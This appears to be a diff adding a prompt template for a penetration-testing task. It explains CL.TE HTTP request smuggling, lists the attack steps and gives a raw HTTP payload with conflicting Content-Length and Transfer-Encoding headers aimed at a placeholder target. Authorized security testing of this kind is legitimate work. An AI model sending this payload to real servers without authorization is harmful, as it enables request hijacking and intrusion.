@@ -1,0 +1,21 @@
+Test the target web infrastructure for HTTP Request Smuggling vulnerabilities (CL.TE variant). Request smuggling occurs when front-end and back-end servers disagree on request boundaries.
+
+CL.TE (Content-Length vs Transfer-Encoding) attack steps:
+1. Craft a request with both Content-Length and Transfer-Encoding: chunked headers
+2. Set Content-Length to the length of the smuggled prefix
+3. Use chunked encoding to hide the smuggled request from the front-end
+4. Verify if the back-end processes the smuggled request as a separate request: {target_url}
+
+Test payload:
+```
+POST / HTTP/1.1
+Host: {target_host}
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+
+Document whether the infrastructure is vulnerable and demonstrate the impact.
